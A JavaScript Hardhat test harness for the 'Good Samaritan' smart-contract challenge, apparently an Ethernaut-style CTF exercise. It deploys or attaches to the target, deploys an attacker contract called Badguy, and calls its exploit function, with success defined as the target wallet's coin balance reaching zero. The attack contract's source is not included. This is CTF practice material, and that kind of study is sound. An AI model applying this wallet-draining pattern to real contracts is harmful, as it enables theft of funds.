const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Good Samaritan', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const GoodSamaritanFactory = await ethers.getContractFactory('GoodSamaritan');
            const WalletFactory = await ethers.getContractFactory('Wallet');
            const CoinFactory = await ethers.getContractFactory('Coin');
            this.target = GoodSamaritanFactory.attach("");
            this.wallet = WalletFactory.attach(await this.target.wallet());
            this.coin = CoinFactory.attach(await this.target.coin());
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const GoodSamaritanFactory = await ethers.getContractFactory('GoodSamaritan', deployer);
            const WalletFactory = await ethers.getContractFactory('Wallet', deployer);
            const CoinFactory = await ethers.getContractFactory('Coin', deployer);
            this.target = await GoodSamaritanFactory.deploy();
            this.wallet = WalletFactory.attach(await this.target.wallet());
            this.coin = CoinFactory.attach(await this.target.coin());
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        console.log(`\t Info...`);
        console.log(`\t Coin.balances[Wallet]  : ${await this.coin.balances(this.wallet.address)}`);
        console.log(`\t Coin.balances[Attacker]: ${await this.coin.balances(attacker.address)}`);

        console.log(`\t Deploying badguy...`);
        const BadguyFactory = await ethers.getContractFactory('Badguy', attacker);
        const Badguy = await BadguyFactory.deploy(this.coin.address);

        console.log(`\t Exploiting...`);
        let expTX = await Badguy.connect(attacker).exploit(this.target.address, {gasLimit:200000}); await expTX.wait();
        console.log(`\t Coin.balances[Wallet]  : ${await this.coin.balances(this.wallet.address)}`);
        console.log(`\t Coin.balances[Attacker]: ${await this.coin.balances(attacker.address)}`);

    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await this.coin.balances(this.wallet.address))).to.be.eq(0);
    });
});